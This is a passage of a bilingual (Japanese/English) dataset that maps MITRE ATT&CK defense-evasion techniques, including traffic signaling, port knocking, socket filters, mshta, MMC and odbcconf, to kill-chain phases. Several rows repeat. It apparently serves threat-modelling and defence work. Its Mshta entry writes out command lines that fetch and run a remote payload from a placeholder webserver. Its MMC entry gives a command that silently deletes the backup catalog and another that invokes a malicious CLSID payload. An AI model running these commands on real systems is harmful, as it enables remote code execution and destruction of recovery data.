Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1205,トラフィックシグナリング,Traffic Signaling,"攻撃者は、永続化やコマンドアンドコントロールに使用されるオープンポートやその他の悪意のある機能を隠すために、トラフィックシグナリングを使用する可能性があります。トラフィックシグナリングには、クローズドポートを開いたり、悪意のあるタスクを実行したりするなど、特別な応答をトリガーするためにシステムに送信する必要があるマジックバリューまたはシーケンスの使用が含まれます。これは、攻撃者がコマンドアンドコントロールに使用できるポートが開かれる前に、特定の特性を持つ一連のパケットを送信するという形をとる場合があります。通常、この一連のパケットは、事前定義された一連のクローズドポートへの接続試行（つまり、[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)）で構成されますが、異常なフラグ、特定の文字列、またはその他の固有の特性を含む場合もあります。シーケンスが完了した後、ポートを開くことはホストベースのファイアウォールによって達成される可能性がありますが、カスタムソフトウェアによって実装される可能性もあります。

攻撃者はまた、既に開いているポートと通信する可能性がありますが、そのポートでリッスンしているサービスは、適切なマジックバリューが渡された場合にのみコマンドに応答したり、他の悪意のある機能をトリガーしたりします。

通信をトリガーするためのシグナルパケットの監視は、さまざまな方法で行うことができます。Cd00r（引用: Hartrell cd00r 2002）によって最初に実装された1つの方法は、libpcapライブラリを使用して問題のパケットをスニッフィングすることです。別の方法は、マルウェアが他のプログラムによって既に使用されているポートを使用できるようにするローソケットを利用します。

ネットワークデバイスでは、攻撃者は細工されたパケットを使用して、telnetなど、デバイスが提供する標準サービスの[ネットワークデバイス認証](https://attack.mitre.org/techniques/T1556/004)を有効にする可能性があります。このようなシグナリングは、telnetなどのクローズドサービスポートを開いたり、デバイス上のマルウェアインプラントのモジュール変更をトリガーして、悪意のある機能を追加、削除、または変更したりするためにも使用される場合があります。攻撃者は、細工されたパケットを使用して1つ以上の（オープンまたはクローズド）ポートに接続しようとする可能性がありますが、目標を達成するために同じポートでルーターインターフェイス、ブロードキャスト、およびネットワークアドレスIPに接続しようとする可能性もあります。(引用: Cisco Synful Knock Evolution)(引用: Mandiant - Synful Knock)(引用: Cisco Blog Legacy Device Attacks) 組込みデバイスでこのトラフィックシグナリングを有効にするには、アーキテクチャのモノリシックな性質のため、攻撃者はまず[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を達成して利用する必要があります。

攻撃者はまた、Wake-on-LAN機能を使用して電源がオフになっているシステムをオンにする可能性があります。Wake-on-LANは、電源がオフになっているシステムにマジックパケットを送信することで電源をオンにしたり、起動したりできるハードウェア機能です。システムがオンになると、横方向の移動のターゲットになる可能性があります。(引用: Bleeping Computer - Ryuk WoL)(引用: AMD Magic Packet)","Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.

Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.

Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",T1205.001,ポートノッキング,Port Knocking,"攻撃者は、永続化やコマンドアンドコントロールに使用されるオープンポートを隠すためにポートノッキングを使用する可能性があります。ポートを有効にするために、攻撃者は事前定義された一連のクローズドポートへの一連の接続試行を送信します。シーケンスが完了した後、ポートを開くことはホストベースのファイアウォールによって行われることが多いですが、カスタムソフトウェアによって実装される可能性もあります。

このテクニックは、リスニングポートの動的なオープンと、別のシステム上のリスニングサーバーへの接続の開始の両方で観察されています。

通信をトリガーするためのシグナルパケットの監視は、さまざまな方法で行うことができます。Cd00r（引用: Hartrell cd00r 2002）によって最初に実装された1つの方法は、libpcapライブラリを使用して問題のパケットをスニッフィングすることです。別の方法は、マルウェアが他のプログラムによって既に使用されているポートを使用できるようにするローソケットを利用します。","Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.

This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1205,トラフィックシグナリング,Traffic Signaling,"攻撃者は、永続化やコマンドアンドコントロールに使用されるオープンポートやその他の悪意のある機能を隠すために、トラフィックシグナリングを使用する可能性があります。トラフィックシグナリングには、クローズドポートを開いたり、悪意のあるタスクを実行したりするなど、特別な応答をトリガーするためにシステムに送信する必要があるマジックバリューまたはシーケンスの使用が含まれます。これは、攻撃者がコマンドアンドコントロールに使用できるポートが開かれる前に、特定の特性を持つ一連のパケットを送信するという形をとる場合があります。通常、この一連のパケットは、事前定義された一連のクローズドポートへの接続試行（つまり、[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)）で構成されますが、異常なフラグ、特定の文字列、またはその他の固有の特性を含む場合もあります。シーケンスが完了した後、ポートを開くことはホストベースのファイアウォールによって達成される可能性がありますが、カスタムソフトウェアによって実装される可能性もあります。

攻撃者はまた、既に開いているポートと通信する可能性がありますが、そのポートでリッスンしているサービスは、適切なマジックバリューが渡された場合にのみコマンドに応答したり、他の悪意のある機能をトリガーしたりします。

通信をトリガーするためのシグナルパケットの監視は、さまざまな方法で行うことができます。Cd00r（引用: Hartrell cd00r 2002）によって最初に実装された1つの方法は、libpcapライブラリを使用して問題のパケットをスニッフィングすることです。別の方法は、マルウェアが他のプログラムによって既に使用されているポートを使用できるようにするローソケットを利用します。

ネットワークデバイスでは、攻撃者は細工されたパケットを使用して、telnetなど、デバイスが提供する標準サービスの[ネットワークデバイス認証](https://attack.mitre.org/techniques/T1556/004)を有効にする可能性があります。このようなシグナリングは、telnetなどのクローズドサービスポートを開いたり、デバイス上のマルウェアインプラントのモジュール変更をトリガーして、悪意のある機能を追加、削除、または変更したりするためにも使用される場合があります。攻撃者は、細工されたパケットを使用して1つ以上の（オープンまたはクローズド）ポートに接続しようとする可能性がありますが、目標を達成するために同じポートでルーターインターフェイス、ブロードキャスト、およびネットワークアドレスIPに接続しようとする可能性もあります。(引用: Cisco Synful Knock Evolution)(引用: Mandiant - Synful Knock)(引用: Cisco Blog Legacy Device Attacks) 組込みデバイスでこのトラフィックシグナリングを有効にするには、アーキテクチャのモノリシックな性質のため、攻撃者はまず[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を達成して利用する必要があります。

攻撃者はまた、Wake-on-LAN機能を使用して電源がオフになっているシステムをオンにする可能性があります。Wake-on-LANは、電源がオフになっているシステムにマジックパケットを送信することで電源をオンにしたり、起動したりできるハードウェア機能です。システムがオンになると、横方向の移動のターゲットになる可能性があります。(引用: Bleeping Computer - Ryuk WoL)(引用: AMD Magic Packet)","Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.

Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).

The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.

Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",T1205.002,ソケットフィルター,Socket Filters,"攻撃者は、永続化やコマンドアンドコントロールに使用されるバックドアを監視してからアクティブ化するために、ネットワークソケットにフィルターをアタッチする可能性があります。昇格された権限を持つ攻撃者は、<code>libpcap</code>ライブラリなどの機能を使用してソケットを開き、特定の種類のデータがソケットを通過することを許可または不許可にするフィルターをインストールできます。フィルターは、指定されたネットワークインターフェイス（または指定されていない場合はすべてのインターフェイス）を通過するすべてのトラフィックに適用される場合があります。ネットワークインターフェイスがフィルター条件に一致するパケットを受信すると、リバースシェルのアクティブ化など、ホストで追加のアクションをトリガーできます。

接続を確立するために、攻撃者はインストールされたフィルター条件に一致する細工されたパケットをターゲットホストに送信します。(引用: haking9 libpcap network sniffing) 攻撃者はこれらのソケットフィルターを使用して、インプラントのインストールをトリガーしたり、ピングバックを実行したり、コマンドシェルを呼び出したりしています。これらのソケットフィルターとの通信は、[プロトコルトンネリング](https://attack.mitre.org/techniques/T1572)と組み合わせて使用される場合もあります。(引用: exatrack bpf filters passive backdoors)(引用: Leonardo Turla Penquin May 2020)

フィルターは、<code>libpcap</code>がインストールされているUnixライクなプラットフォーム、または<code>Winpcap</code>を使用しているWindowsホストにインストールできます。攻撃者は、<code>libpcap</code>と<code>pcap_setfilter</code>を使用するか、標準ライブラリ関数<code>setsockopt</code>と<code>SO_ATTACH_FILTER</code>オプションを使用する場合があります。パケットが受信されるまでソケット接続はアクティブではないため、ホストでのアクティビティの欠如、低いCPUオーバーヘッド、およびローソケット使用状況への限定的な可視性により、この動作を検出することは困難な場合があります。","Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.

To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)

Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.005,Mshta,Mshta,"攻撃者はmshta.exeを悪用して、信頼できるWindowsユーティリティを介して悪意のある.htaファイルやJavascriptまたはVBScriptの実行をプロキシする可能性があります。初期侵害時やコード実行時にmshta.exeを利用するさまざまな種類の脅威の例がいくつかあります。(引用: Cylance Dust Storm) (引用: Red Canary HTA Abuse Part Deux) (引用: FireEye Attacks Leveraging HTA) (引用: Airbus Security Kovter Analysis) (引用: FireEye FIN7 April 2017)

Mshta.exeは、Microsoft HTMLアプリケーション（HTA）ファイルを実行するユーティリティです。(引用: Wikipedia HTML Application) HTAは、Internet Explorerと同じモデルとテクノロジを使用して実行されますが、ブラウザの外部で実行されるスタンドアロンアプリケーションです。(引用: MSDN HTML Applications)

ファイルは、インラインスクリプトを介してmshta.exeによって実行される場合があります：<code>mshta vbscript:Close(Execute(\""GetObject(\""\""script:https[:]//webserver/payload[.]sct\""\"")\""))</code>

URLから直接実行することもできます：<code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exeは、その潜在的な使用を考慮していないアプリケーション制御ソリューションをバイパスするために使用できます。mshta.exeはInternet Explorerのセキュリティコンテキストの外部で実行されるため、ブラウザのセキュリティ設定もバイパスします。(引用: LOLBAS Mshta)","Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017)

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)

Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\""GetObject(\""\""script:https[:]//webserver/payload[.]sct\""\"")\""))</code>

They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.014,MMC,MMC,"攻撃者はmmc.exeを悪用して、悪意のある.mscファイルの実行をプロキシする可能性があります。Microsoft Management Console（MMC）は、Microsoftによって署名されている可能性のあるバイナリであり、GUIまたはコマンドプロンプトでいくつかの方法で使用されます。(引用: win_mmc)(引用: what_is_mmc) MMCは、Microsoftによって作成された管理ツール（スナップインと呼ばれる）を含むカスタムコンソールを作成、オープン、および保存するために使用できます。これらのスナップインは、Windowsシステムをローカルまたはリモートで管理するために使用できます。MMCはまた、システム構成を管理するためにMicrosoftが作成した.mscファイルを開くためにも使用できます。(引用: win_msc_files_overview)

例えば、<code>mmc C:\\Users\\foo\\admintools.msc /a</code>は、カスタムの保存済みコンソールmscファイルを作成者モードで開きます。(引用: win_mmc) もう1つの一般的な例は<code>mmc gpedit.msc</code>で、これはグループポリシーエディターアプリケーションウィンドウを開きます。

攻撃者はMMCコマンドを使用して悪意のあるタスクを実行する可能性があります。例えば、<code>mmc wbadmin.msc delete catalog -quiet</code>は、ユーザーへのプロンプトなしにシステム上のバックアップカタログを削除します（つまり、[システム回復の阻害](https://attack.mitre.org/techniques/T1490)）（注：<code>wbadmin.msc</code>はデフォルトではWindows Serverオペレーティングシステムにのみ存在する場合があります）。(引用: win_wbadmin_delete_catalog)(引用: phobos_virustotal)

攻撃者はまた、MMCを悪用して悪意のある.mscファイルを実行する可能性があります。例えば、攻撃者はまず、[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)クラスオブジェクトを一意に識別する悪意のあるレジストリクラス識別子（CLSID）サブキーを作成する可能性があります。(引用: win_clsid_key) 次に、攻撃者は悪意のあるCLSIDサブキーにリンクされた「Webアドレスへのリンク」スナップインを含むカスタムコンソールを作成する可能性があります。(引用: mmc_vulns) .mscファイルが保存されると、攻撃者は次のコマンドで悪意のあるCLSIDペイロードを呼び出す可能性があります：<code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>。(引用: abusing_com_reg)","Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)

For example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window.

Adversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)

Adversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation: abusing_com_reg)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1218,システムバイナリプロキシ実行,System Binary Proxy Execution,"攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。

同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)","Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.

Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",T1218.008,Odbcconf,Odbcconf,"攻撃者はodbcconf.exeを悪用して、悪意のあるペイロードの実行をプロキシする可能性があります。Odbcconf.exeは、Open Database Connectivity（ODBC）ドライバーとデータソース名を設定できるWindowsユーティリティです。(引用: Microsoft odbcconf.exe) Odbcconf.exeバイナリはMicrosoftによってデジタル署名されている場合があります。

